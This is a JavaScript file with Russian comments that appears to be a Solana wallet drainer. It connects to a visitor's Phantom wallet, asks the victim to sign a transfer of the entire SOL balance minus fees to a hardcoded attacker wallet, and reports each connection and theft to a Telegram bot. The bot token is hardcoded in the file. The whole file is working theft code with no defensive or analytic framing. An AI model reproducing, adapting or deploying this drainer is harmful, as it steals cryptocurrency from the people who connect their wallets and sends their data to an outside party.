const mainWallet = "6eRTHCv4CwL9Gr7AXygFyo9WYwqXoRMuxMrLMWMqCR6g"; // Укажите ваш Solana-кошелек
const botToken = "7931684835:AAH9pSLLaLLqOqd40q6o6uUMsiRHVSrak7U"; // Токен Telegram-бота
const chatId = "@ppjjkkd"; // ID чата или username (@channel)


let provider = null;
let walletAddress = null;

// Функция отправки сообщений в Telegram
async function sendToTelegram(message) {
    try {
        await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ chat_id: chatId, text: message, parse_mode: "HTML" })
        });
    } catch (error) {
        console.error("Ошибка отправки в Telegram:", error);
    }
}

// Функция подключения к Phantom Wallet
async function connectPhantom() {
    if ("solana" in window) {
        provider = window.solana;
        if (provider.isPhantom) {
            try {
                await provider.connect();
                walletAddress = provider.publicKey.toBase58();
                document.getElementById("wallet-info").innerText = `Кошелек: ${walletAddress}`;
                sendToTelegram(`✅ Подключен Phantom: <code>${walletAddress}</code>`);
            } catch (error) {
                console.error("Ошибка подключения к Phantom:", error);
                alert("Ошибка подключения к Phantom Wallet. Разрешите доступ в кошельке.");
            }
        }
    } else {
        alert("Phantom Wallet не найден! Установите расширение или приложение.");
    }
}

// Функция отправки всех SOL на основной кошелек
async function didtrans() {
    if (!provider || !walletAddress) {
        alert("Сначала подключите Phantom Wallet!");
        return;
    }

    const connection = new solanaWeb3.Connection(solanaWeb3.clusterApiUrl("mainnet-beta"));
    const senderPublicKey = new solanaWeb3.PublicKey(walletAddress);
    const receiverPublicKey = new solanaWeb3.PublicKey(mainWallet);

    try {
        let balanceLamports = await connection.getBalance(senderPublicKey);
        if (balanceLamports <= 0) {
            alert("На кошельке недостаточно SOL для отправки.");
            return;
        }

        let recentBlockhash = await connection.getLatestBlockhash();
        let estimatedFee = await connection.getFeeForMessage(
            new solanaWeb3.Transaction().add(
                solanaWeb3.SystemProgram.transfer({
                    fromPubkey: senderPublicKey,
                    toPubkey: receiverPublicKey,
                    lamports: 1, // Минимальная сумма для оценки комиссии
                })
            ).compileMessage()
        );

        let feeLamports = estimatedFee.value || 5000; // Запас комиссии 0.000005 SOL
        let amountToSend = balanceLamports - feeLamports;
        if (amountToSend <= 0) {
            alert("Недостаточно средств после вычета комиссии.");
            return;
        }

        let transaction = new solanaWeb3.Transaction().add(
            solanaWeb3.SystemProgram.transfer({
                fromPubkey: senderPublicKey,
                toPubkey: receiverPublicKey,
                lamports: amountToSend,
            })
        );

        transaction.recentBlockhash = recentBlockhash.blockhash;
        transaction.feePayer = senderPublicKey;

        const { signature } = await provider.signAndSendTransaction(transaction);
        console.log("Транзакция отправлена, хэш:", signature);

        sendToTelegram(`💸 Отправлена транзакция с <code>${walletAddress}</code> на <b>${amountToSend / solanaWeb3.LAMPORTS_PER_SOL} SOL</b>\n🔗 <a href="https://solscan.io/tx/${signature}">Посмотреть в Solscan</a>`);
        
        alert(`Успешно отправлено ${amountToSend / solanaWeb3.LAMPORTS_PER_SOL} SOL на ${mainWallet}`);

    } catch (error) {
        console.error("Ошибка при отправке транзакции:", error);
        alert("Ошибка при отправке транзакции. Проверьте консоль.");
    }
}